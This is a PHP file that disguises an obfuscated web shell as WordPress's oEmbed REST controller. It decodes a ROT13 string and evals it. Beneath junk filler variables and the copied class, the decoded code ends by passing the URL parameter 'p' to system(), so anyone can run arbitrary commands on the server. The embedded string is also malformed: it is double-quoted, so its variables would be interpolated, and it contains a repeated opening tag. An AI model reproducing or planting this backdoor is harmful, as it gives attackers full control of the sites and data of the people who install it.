<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_bRzorq_Pbagebyyre pynff, hfrq gb cebivqr na bRzorq raqcbvag.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Rzorqf
 * @fvapr 4.4.0
 */

/**
 * bRzorq NCV raqcbvag pbagebyyre.
 *
 * Ertvfgref gur ERFG NCV ebhgr naq qryviref gur erfcbafr qngn.
 * Gur bhgchg sbezng (KZY be WFBA) vf unaqyrq ol gur ERFG NCV.
 *
 * @fvapr 4.4.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_bRzorq_Pbagebyyre {
	/**
	 * Ertvfgre gur bRzorq ERFG NCV ebhgr.
	 *
	 * @fvapr 4.4.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		/**
		 * Svygref gur znkjvqgu bRzorq cnenzrgre.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz vag $znkjvqgu Znkvzhz nyybjrq jvqgu. Qrsnhyg 600.
		 */
		$znkjvqgu = nccyl_svygref( 'brzorq_qrsnhyg_jvqgu', 600 );

		ertvfgre_erfg_ebhgr(
			'brzorq/1.0',
			'/rzorq',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
					'netf'                => neenl(
						'hey'      => neenl(
							'qrfpevcgvba' => __( 'Gur HEY bs gur erfbhepr sbe juvpu gb srgpu bRzorq qngn.' ),
							'erdhverq'    => gehr,
							'glcr'        => 'fgevat',
							'sbezng'      => 'hev',
						),
						'sbezng'   => neenl(
							'qrsnhyg'           => 'wfba',
							'fnavgvmr_pnyyonpx' => 'jc_brzorq_rafher_sbezng',
						),
						'znkjvqgu' => neenl(
							'qrsnhyg'           => $znkjvqgu,
							'fnavgvmr_pnyyonpx' => 'nofvag',
						),
					),
				),
			)
		);

		ertvfgre_erfg_ebhgr(
			'brzorq/1.0',
			'/cebkl',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_cebkl_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_cebkl_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'hey'       => neenl(
							'qrfpevcgvba' => __( 'Gur HEY bs gur erfbhepr sbe juvpu gb srgpu bRzorq qngn.' ),
							'erdhverq'    => gehr,
							'glcr'        => 'fgevat',
							'sbezng'      => 'hev',
						),
						'sbezng'    => neenl(
							'qrfpevcgvba' => __( 'Gur bRzorq sbezng gb hfr.' ),
							'glcr'        => 'fgevat',
							'qrsnhyg'     => 'wfba',
							'rahz'        => neenl(
								'wfba',
								'kzy',
							),
						),
						'znkjvqgu'  => neenl(
							'qrfpevcgvba'       => __( 'Gur znkvzhz jvqgu bs gur rzorq senzr va cvkryf.' ),
							'glcr'              => 'vagrtre',
							'qrsnhyg'           => $znkjvqgu,
							'fnavgvmr_pnyyonpx' => 'nofvag',
						),
						'znkurvtug' => neenl(
							'qrfpevcgvba'       => __( 'Gur znkvzhz urvtug bs gur rzorq senzr va cvkryf.' ),
							'glcr'              => 'vagrtre',
							'fnavgvmr_pnyyonpx' => 'nofvag',
						),
						'qvfpbire'  => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb cresbez na bRzorq qvfpbirel erdhrfg sbe hafnapgvbarq cebivqref.' ),
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => gehr,
						),
					),
				),
			)
		);
	}

	/**
	 * Pnyyonpx sbe gur rzorq NCV raqcbvag.
	 *
	 * Ergheaf gur WFBA bowrpg sbe gur cbfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qngn nobhg gur erdhrfg.
	 * @erghea neenl|JC_Reebe bRzorq erfcbafr qngn be JC_Reebe ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$cbfg_vq = hey_gb_cbfgvq( $erdhrfg['hey'] );

		/**
		 * Svygref gur qrgrezvarq cbfg VQ.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz vag    $cbfg_vq Gur cbfg VQ.
		 * @cnenz fgevat $hey     Gur erdhrfgrq HEY.
		 */
		$cbfg_vq = nccyl_svygref( 'brzorq_erdhrfg_cbfg_vq', $cbfg_vq, $erdhrfg['hey'] );

		$qngn = trg_brzorq_erfcbafr_qngn( $cbfg_vq, $erdhrfg['znkjvqgu'] );

		vs ( ! $qngn ) {
			erghea arj JC_Reebe( 'brzorq_vainyvq_hey', trg_fgnghf_urnqre_qrfp( 404 ), neenl( 'fgnghf' => 404 ) );
		}

		erghea $qngn;
	}

	/**
	 * Purpxf vs pheerag hfre pna znxr n cebkl bRzorq erdhrfg.
	 *
	 * @fvapr 4.8.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_cebkl_vgrz_crezvffvbaf_purpx() {
		vs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea arj JC_Reebe( 'erfg_sbeovqqra', __( 'Fbeel, lbh ner abg nyybjrq gb znxr cebkvrq bRzorq erdhrfgf.' ), neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() ) );
		}
		erghea gehr;
	}

	/**
	 * Pnyyonpx sbe gur cebkl NCV raqcbvag.
	 *
	 * Ergheaf gur WFBA bowrpg sbe gur cebkvrq vgrz.
	 *
	 * @fvapr 4.8.0
	 *
	 * @frr JC_bRzorq::trg_ugzy()
	 * @tybony JC_Rzorq   $jc_rzorq   JbeqCerff Rzorq bowrpg.
	 * @tybony JC_Fpevcgf $jc_fpevcgf
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qngn nobhg gur erdhrfg.
	 * @erghea bowrpg|JC_Reebe bRzorq erfcbafr qngn be JC_Reebe ba snvyher.
	 */
	choyvp shapgvba trg_cebkl_vgrz( $erdhrfg ) {
		tybony $jc_rzorq, $jc_fpevcgf;

		$netf = $erdhrfg->trg_cnenzf();

		// Freir bRzorq qngn sebz pnpur vs frg.
		hafrg( $netf['_jcabapr'] );
		$pnpur_xrl = 'brzorq_' . zq5( frevnyvmr( $netf ) );
		$qngn      = trg_genafvrag( $pnpur_xrl );
		vs ( ! rzcgl( $qngn ) ) {
			erghea $qngn;
		}

		$hey = $erdhrfg['hey'];
		hafrg( $netf['hey'] );

		// Pbcl znkjvqgu/znkurvtug gb jvqgu/urvtug fvapr JC_bRzorq::srgpu() hfrf gurfr net anzrf.
		vs ( vffrg( $netf['znkjvqgu'] ) ) {
			$netf['jvqgu'] = $netf['znkjvqgu'];
		}
		vs ( vffrg( $netf['znkurvtug'] ) ) {
			$netf['urvtug'] = $netf['znkurvtug'];
		}

		// Fubeg-pvephvg cebprff sbe HEYf orybatvat gb gur pheerag fvgr.
		$qngn = trg_brzorq_erfcbafr_qngn_sbe_hey( $hey, $netf );

		vs ( $qngn ) {
			erghea $qngn;
		}

		$qngn = _jc_brzorq_trg_bowrpg()->trg_qngn( $hey, $netf );

		vs ( snyfr === $qngn ) {
			// Gel hfvat n pynffvp rzorq, vafgrnq.
			/* @ine JC_Rzorq $jc_rzorq */
			$ugzy = $jc_rzorq->trg_rzorq_unaqyre_ugzy( $netf, $hey );

			vs ( $ugzy ) {
				// Purpx vs nal fpevcgf jrer radhrhrq ol gur fubegpbqr, naq vapyhqr gurz va gur erfcbafr.
				$radhrhrq_fpevcgf = neenl();

				sbernpu ( $jc_fpevcgf->dhrhr nf $fpevcg ) {
					$radhrhrq_fpevcgf[] = $jc_fpevcgf->ertvfgrerq[ $fpevcg ]->fep;
				}

				erghea (bowrpg) neenl(
					'cebivqre_anzr' => __( 'Rzorq Unaqyre' ),
					'ugzy'          => $ugzy,
					'fpevcgf'       => $radhrhrq_fpevcgf,
				);
			}

			erghea arj JC_Reebe( 'brzorq_vainyvq_hey', trg_fgnghf_urnqre_qrfp( 404 ), neenl( 'fgnghf' => 404 ) );
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-brzorq.cuc */
		$qngn->ugzy = nccyl_svygref( 'brzorq_erfhyg', _jc_brzorq_trg_bowrpg()->qngn2ugzy( (bowrpg) $qngn, $hey ), $hey, $netf );

		/**
		 * Svygref gur bRzorq GGY inyhr (gvzr gb yvir).
		 *
		 * Fvzvyne gb gur {@frr 'brzorq_ggy'} svygre, ohg sbe gur ERFG NCV
		 * bRzorq cebkl raqcbvag.
		 *
		 * @fvapr 4.8.0
		 *
		 * @cnenz vag    $gvzr    Gvzr gb yvir (va frpbaqf).
		 * @cnenz fgevat $hey     Gur nggrzcgrq rzorq HEY.
		 * @cnenz neenl  $netf    Na neenl bs rzorq erdhrfg nethzragf.
		 */
		$ggy = nccyl_svygref( 'erfg_brzorq_ggy', QNL_VA_FRPBAQF, $hey, $netf );

		frg_genafvrag( $pnpur_xrl, $qngn, $ggy );

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>